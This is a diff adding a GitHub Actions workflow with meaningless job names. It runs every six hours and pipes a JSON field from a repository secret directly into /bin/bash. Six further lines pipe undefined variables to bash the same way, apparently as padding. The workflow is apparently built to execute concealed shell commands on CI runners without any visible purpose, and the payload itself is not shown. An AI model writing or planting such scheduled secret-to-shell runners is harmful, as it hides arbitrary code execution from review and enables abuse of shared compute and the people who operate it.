@@ -1,0 +1,23 @@
+name: chengliangqiang5432
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengliangqiang5432
+        env:
+          jtcx006: ${{ secrets.jtcx006 }}
+        run: |
+          echo $jtcx006 | jq -r .c56 | /bin/bash
+          echo $iutyj34 | jq -r .ikq75389 | /bin/bash
+          echo $y33652 | jq -r .kipot5480 | /bin/bash
+          echo $fp96 | jq -r .o39427 | /bin/bash
+          echo $dfh261 | jq -r .jwt700 | /bin/bash
+          echo $oowk31661 | jq -r .zaih52 | /bin/bash
+          echo $hg359 | jq -r .vdrl7 | /bin/bash
+
